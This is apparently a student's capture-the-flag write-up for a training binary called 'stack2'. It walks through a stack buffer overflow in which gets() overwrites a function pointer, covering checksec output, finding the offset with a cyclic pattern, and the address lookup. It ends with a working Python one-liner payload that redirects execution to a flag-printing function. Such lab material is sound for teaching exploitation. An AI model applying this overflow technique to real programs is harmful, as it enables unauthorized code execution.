# stack2

Control flow hijacking

## Inital Exlporation

``` bash
$ cd /problems/stack2r-64_7_6f3f38bb74a66565cc9342709dadda5e/
$ pwn checksec ./stack2-64 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- This is in little endian
- has PIE enabled

## Code analysis

> [!NOTE]
> Full code is in ./stack2.c

``` C
void recalibration() {
    // need to get here to print the flag
}

int main(int argc, char **argv) {
    volatile int (*fp)(); 
    char buffer[{{buffsize}}]; // <-- the buffer we need to exploit and overflow 

    fp = 0; // <-- function pointer called below.

    gets(buffer); // <-- vulnerable function

    if (fp) { 
        printf("Calling function pointer, jumping to %p\n", fp);
        fp();
    }
}
```

## Figuring out offset

> [!NOTE]
> Aestrix are here for visualization purposes, they are not part of either input or output.

- injecting cyclic 100: `**aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaan**aaa*oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa*`
  - buffer is: `**aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaan**`
  - fp is: `*oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa*`
- len of cyclic string minus fp is 56; offset is 56

## Getting Recalibration

- we need to know the address of recalibration to inject it into fp

```bash
$ objdump -d /problems/stack2r-64_7_6f3f38bb74a66565cc9342709dadda5e/stack2-64 | grep recalibration

00000000000007aa <recalibration>:
```

- Now, we know the address, and the offset.
- Trying to modify the script with that did not work. Instead, we need to get the address within gdb by doing `p recalibrate` which yields `0x5555555547aa`.
- Plugging this into our script, we get:

``` python
exploit_str = b"A" * offset + p64(0x5555555547aa)
```

## It works! Now what?

- We need to run the file directly, and manually input the exploit string. This is due to the binary running with different permissions than it would get via GDB
- To get the converted string, enter the python3 enviornment and run the code for our exploit stirng crafting. we will get
`b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaaGUUUU\x00\x00'`

### Try #1

- Piping the string directly into the binary didnt work, so i tried to manually build it with so
- I converted the hexadecimal directly into a little endian expressed bit string

``` bash
$ python3 -u -c 'print(b"A" * 56 + b"\xaa\x47\x55\x55\x55\x55\x00\x00")' | ./stack2-64 
Calling function pointer, jumping to 0x55476161785c4141
Segmentation fault (core dumped)
```

- Doing this, we get issues with terminal input inputting unwanted ascii characters

### Try #2

```bash
python3 -u -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaaGUUUU\x00\x00")' | ./stack2-64
```

this works!!!
